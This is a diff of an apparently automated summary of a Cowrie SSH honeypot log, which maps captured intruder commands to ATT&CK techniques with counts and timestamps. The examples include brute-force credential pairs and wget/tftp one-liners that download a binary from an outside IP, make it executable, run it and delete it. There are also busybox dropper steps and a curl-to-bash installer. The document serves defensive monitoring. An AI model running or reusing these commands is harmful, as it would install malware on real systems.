@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 03:01:10",
+  "generated": "2026-08-29 04:03:44",
   "totals": {
-    "commands": 88,
-    "login_failed": 168,
-    "login_success": 12,
-    "sessions": 185
+    "commands": 134,
+    "login_failed": 197,
+    "login_success": 19,
+    "sessions": 275
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 168,
+      "count": 197,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,27 +21,14 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T02:55:58.418849Z",
-      "unique_ips": 16
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 15,
-      "examples": [
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
-      ],
-      "first": "2026-08-29T00:23:05.332392Z",
-      "last": "2026-08-29T02:50:30.801017Z",
-      "unique_ips": 2
+      "last": "2026-08-29T04:00:03.800608Z",
+      "unique_ips": 22
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 12,
+      "count": 19,
       "examples": [
         "root / 123@@@",
         "ubuntu / ubuntu",
@@ -50,31 +37,63 @@
         "admin / 12345"
       ],
       "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T02:49:32.075635Z",
-      "unique_ips": 8
+      "last": "2026-08-29T03:53:44.811767Z",
+      "unique_ips": 15
     },
     {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "tactic": "Discovery",
-      "count": 2,
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 19,
       "examples": [
-        "uname -a"
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
-      "first": "2026-08-29T01:00:06.084418Z",
-      "last": "2026-08-29T01:48:12.379780Z",
-      "unique_ips": 2
+      "first": "2026-08-29T00:23:05.332392Z",
+      "last": "2026-08-29T03:08:15.987989Z",
+      "unique_ips": 3
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 2,
+      "count": 17,
       "examples": [
-        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx"
+        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
+        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-29T02:21:36.689252Z",
-      "last": "2026-08-29T02:21:38.189361Z",
+      "last": "2026-08-29T03:08:15.987989Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "uname -a"
+      ],
+      "first": "2026-08-29T01:00:06.084418Z",
+      "last": "2026-08-29T03:24:57.991825Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-29T03:07:39.054930Z",
+      "last": "2026-08-29T03:07:39.054930Z",
       "unique_ips": 1
     },
     {
@@ -92,24 +111,40 @@
   ],
   "unmapped": [
     [
-      "enable",
-      4
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      12
     ],
     [
       "system",
-      4
+      7
     ],
     [
       "shell",
-      4
+      7
     ],
     [
       "sh",
-      4
+      7
+    ],
+    [
+      "enable",
+      6
     ],
     [
       "linuxshell",
+      6
+    ],
+    [
+      "ping ;sh",
       4
+    ],
+    [
+      "enablelinuxshell",
+      3
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      3
     ],
     [
       "/bin/busybox",
@@ -125,14 +160,6 @@
     ],
     [
       "rm /tmp/bendi.py",
-      2
-    ],
-    [
-      "ping ;sh",
-      2
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       2
     ],
     [
@@ -161,14 +188,6 @@
     ],
     [
       ">/.codi && cd /",
-      2
-    ],
-    [
-      ">/dev/netslink/.codi && cd /dev/netslink/",
-      2
-    ],
-    [
-      ">/dev/shm/.codi && cd /dev/shm/",
       2
     ]
   ]
